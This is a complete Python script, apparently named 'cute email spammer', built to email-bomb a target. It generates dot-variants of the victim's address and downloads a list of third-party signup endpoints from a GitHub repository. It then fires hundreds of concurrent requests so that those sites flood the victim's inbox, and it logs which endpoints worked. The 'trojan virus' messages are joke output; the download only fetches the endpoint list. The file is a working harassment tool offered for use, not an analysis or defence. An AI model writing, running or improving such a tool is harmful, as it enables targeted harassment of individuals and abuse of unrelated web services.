import asyncio, aiohttp, time, re, random, string, itertools, os, json
from urllib.parse import urlencode

# CONFIG ^_^
size = 500 # threads per iteration
cap = 200  # thread limit / set to None for unlimited (i do NOT recommend higher than 1000)

# skidded from chatgpt
def generate_email_variants(email):
    username, domain = email.split("@")
    variants = []

    funnylimit = 2000 - 1 # -1 cuz i felt like it

    for i in range(1, len(username)):
        if len(variants) >= funnylimit:
            break
        for combo in itertools.combinations(range(1, len(username)), i):
            if len(variants) >= funnylimit:
                break
            variant = username
            for index in reversed(combo):
                if len(variants) >= funnylimit:
                    break
                variant = variant[:index] + '.' + variant[index:]
            variants.append(variant)

    results = [email] + list(
        sorted(dict.fromkeys([variant + "@" + domain
                              for variant in variants])))
    return results


# skidded from a weird guy 
def generate_username(length: int = 5):
    min_lc = ord('a')
    len_lc = 26
    ba = bytearray(os.urandom(length))
    for i, b in enumerate(ba):
        ba[i] = min_lc + b % len_lc
    return str(time.time()).replace(".", "") + ba.decode('ascii')


# skidded from regex ^_^
def validate_email(email):
    return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email)


# skidded from "Laurence Gonsalves" on stackoverflow
# i think they deleted their account :(
def clamp(value, min_value, max_value):
    return max(min_value, min(value, max_value))

def divide():
    print("-" * 20)


progress = 0


def update_progress():
    global progress
    progress += 1
    decimal = progress / total
    amount = 30
    white = "█" * int(amount - int((1 - decimal) * amount))
    black = "░" * int(amount - int(decimal * amount))
    print(f"⚡ {progress}/{total} {round(decimal*100, 1):.1f}%「{white}{black}」", end="\r")
    if progress >= total:
        print("\r")

status_codes = {}
working = []

async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None):
    def fix(lol):
        try:
            required = isinstance(lol, (dict, tuple, list))
            result = json.dumps(lol) if required else lol
            result = result.replace("{email}", sub).replace("{password}", password).replace("{random}", generate_username()).replace("{username}", generate_username()).replace("{frenchnumber}", str(random.randint(100_000_000, 999_999_999)))
            result = json.loads(result) if required else result
        except Exception:
            import traceback
            print(traceback.format_exc())
        return result
    try:
        url = fix(info.get("url"))
        method = info.get("method", "POST").upper()
        js = info.get("json", None)
        if js is not None:
            js = fix(js)
        data = info.get("data", None)
        if data is not None:
            data = fix(data)
        params = info.get("params", None)
        if params is not None:
            params = fix(params)
        headers = info.get("headers", None)
        cookies = info.get("cookies", None)
        async with session.request(
            method=method,
            url=url, 
            json=js,
            params=params,
            data=data,
            headers=headers,
            cookies=cookies
        ) as resp:
            status = resp.status
            evaluation = "FAILURE" if status >= 400 else "SUCCESS"
            resp = await resp.text()
            resp = resp.strip().replace("\n", "").replace("\r", "").replace("\t", "")[:1000]
            if status_codes.get(name) is None:
                status_codes[name] = {
                    "method": method,
                    "status": status,
                    "evaluation": evaluation,
                    "url": url,
                    "resp": resp
                }
    except (Exception, asyncio.TimeoutError):
        pass
    update_progress()

async def main():
    print("""
    ▄████▄   █    ██ ▄▄▄█████▓▓█████    ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓         ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
    ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
    ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░▒███      ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
    ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
    ▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
    ░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░   ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
    ░  ▒   ░░▒░ ░ ░     ░     ░ ░  ░    ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
    ░         ░░░ ░ ░   ░         ░         ░   ░      ░     ░   ▒    ▒ ░  ░ ░      ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
    ░ ░         ░                 ░  ░      ░  ░       ░         ░  ░ ░      ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░     
    ░                                                                                                                                                 
        """)
    async with aiohttp.ClientSession() as session:
        directory = os.path.dirname(__file__)
        try:
            with open(f"{directory}\\functions.json", "r") as file:
                functions = json.load(file)
        except Exception:
            print("⚠️ error ⚠️⚠️error no data found!!")
            print("downloading t̷r̵o̷j̶a̴n̷ ̴v̶i̴r̴u̶s̷ ̴ to compensate for loss")
            async with session.get("https://raw.githubusercontent.com/Inkthirsty/cute-email-spammer/main/functions.json") as resp:
                functions = await resp.json()
                print("beep boop successfully downloaded your t̸̨̀ṛ̴̣̎͝o̴̲̒̓j̴̛̟̺̍a̶̛̟n̵͚̫̕ ̵̞̍̌v̶̗͔͆͠i̷͉̘͐r̴̛̬u̷͍̽͋s̸̓͜ ̶̝̠̈́͊ ")
        global progress, total, password, threads
        password = ""
        samples = [string.ascii_lowercase, string.ascii_uppercase, string.digits]
        for _ in samples:
            password += "".join(random.sample(_, k=5))
        password = "!" + "".join(random.sample(password, k=len(password)))

        email = None
        while True:
            email = input("type cute email address here: ").strip().lower()
            if validate_email(email):
                break
            print("invalid email go fuck yourself")

        variants = generate_email_variants(email)
        threads = None
        while True:
            try:
                limit = clamp(len(variants), 1, cap or float("inf"))
                threads = input(f"threads per batch (1-{limit}): ")
                if threads == "":
                    threads = limit
                threads = clamp(int(threads), 1, limit)
                break
            except:
                print("🤬 that is not a number")

        variants = variants[:threads]
        total = len(functions) * len(variants)
        divide()
        print("📌 useless session info")
        global debug
        debug = threads == 1
        info = {
            "EMAIL": email,
            "PASSWORD": password,
            "THREADS": threads,
            "DEBUG MODE": debug,
        }
        print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
        divide()
        if debug:
            testlast = input("⚠️ debug mode is active, type Y to only test the last function ").strip().lower() == "y"
            if testlast:
                total = 1
                functions = dict([next(reversed(functions.items()))])
        else:
            print("pretesting endpoints to grant 2 minutes of life ♥ ♥ ♡")
            test_tasks = [asyncio.create_task(fetch(session, email, values, name)) for name, values in functions.items()]
            total = len(test_tasks)
            for j in range(0, len(test_tasks), size):
                try: await asyncio.gather(*test_tasks[j:j+size])
                except Exception: pass
                await asyncio.sleep(1)
            working = [k for k, v in status_codes.items() if v.get("status") < 400]
            print(f"{len(working)} of {len(test_tasks)} are working")
            functions = {k: v for k, v in functions.items() if k in working}
            variants = variants[1:]
            print(f"{len(test_tasks):,} endpoints have been tested -- {round((len(functions)/len(test_tasks))*100, 1):.1f}% success rate")
            total = len(functions) * len(variants)
            progress = 0
        print("🧵 initializing threads...")
        start = time.time()
        tasks = [asyncio.create_task(fetch(session, sub, values, name)) for sub in variants for name, values in functions.items()]
        print("sending some cute emails to your friends")
        for j in range(0, len(tasks), size):
            try: await asyncio.gather(*tasks[j:j+size])
            except Exception: pass
            await asyncio.sleep(1)
        with open(f"{directory}\\results.txt", "w", encoding="utf-8") as file:
            file.write("\n\n".join([(f"{name or 'Unknown'} -- {values['method']} -- {values['status']} -- {values['evaluation']}\nURL: {values['url']}\nRESPONSE: {values['resp']}") for name, values in status_codes.items()]))
        taken = time.time() - start
        minutes, seconds = int(taken // 60), int(taken % 60)
        print(f"🤣 attempted to send {total:,} emails in {minutes}:{seconds:02} seconds")
        print("remember that some emails will be delayed or never arrive")
        async with session.get("https://raw.githack.com/Inkthirsty/cute-email-spammer/main/adjectives.json") as resp:
            words = ", ".join(random.sample(await resp.json(), k=5))
        prefix = "an" if words[0] in "aeiou" else "a"
        print(f"i hope you have {prefix} {words} day ^_^")
        await asyncio.sleep(10)  # intentional delay before the program commits suicide

if __name__ == "__main__":
    try:
        # real programmers would tell me this is unnecessary but i hate the constant "EVENT LOOP ENDED" errors so this shuts it up sometimes
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass
    asyncio.run(main())
